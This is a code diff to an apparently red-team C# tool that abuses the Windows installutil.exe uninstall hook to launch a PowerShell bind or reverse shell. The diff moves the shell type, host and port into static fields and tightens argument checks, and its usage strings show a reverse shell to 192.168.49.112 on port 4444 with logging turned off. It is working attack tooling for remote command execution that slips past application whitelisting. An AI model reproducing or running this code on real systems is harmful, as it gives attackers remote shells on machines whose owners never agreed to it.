@@ -15,6 +15,10 @@ using System.Configuration.Install;
 [System.ComponentModel.RunInstaller(true)]
 public class Uninstaller : System.Configuration.Install.Installer
 {
+    public static string shellType = null;
+    public static string host = null;
+    public static string port = null;
+
     public static void ExecuteBindShell()
     {
         Runspace runspace = RunspaceFactory.CreateRunspace();
@@ -55,7 +59,7 @@ public class Uninstaller : System.Configuration.Install.Installer
         while (command != "exit");
     }
 
-    public static void ExecuteReverseShell(string host, string port)
+    public static void ExecuteReverseShell()
     {
         Runspace runspace = RunspaceFactory.CreateRunspace();
         runspace.Open();
@@ -99,25 +103,24 @@ $client.Close();";
 
     public override void Uninstall(System.Collections.IDictionary savedState)
     {
-        string shellType = this.Context.Parameters["shelltype"];
-        string host = this.Context.Parameters["host"];
-        string port = this.Context.Parameters["port"];
+        shellType = this.Context.Parameters["shelltype"];
+        host = this.Context.Parameters["host"];
+        port = this.Context.Parameters["port"];
         string filename = Path.GetFileName(this.Context.Parameters["assemblypath"]);
 
-        if (shellType == null)
+        if (shellType != "bind" && shellType != "reverse")
         {
             Console.WriteLine("[-] Must specify shell type : bind, reverse");
             Console.WriteLine("[-] Usage : C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U /shelltype=bind " + filename);
             return;
         }
-        if (shellType == "reverse" && (host == null || port == null))
+        else if (shellType == "reverse" && (host == null || port == null))
         {
             Console.WriteLine("[-] Must specify remote host and port for a reverse shell");
             Console.WriteLine("[-] Usage : C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U /shelltype=reverse /host=192.168.49.112 /port=4444 " + filename);
             return;
         }
 
-        string[] args = new string[] { shellType, host, port };
-        main.Main(args);
+        main.Main();
     }
 }
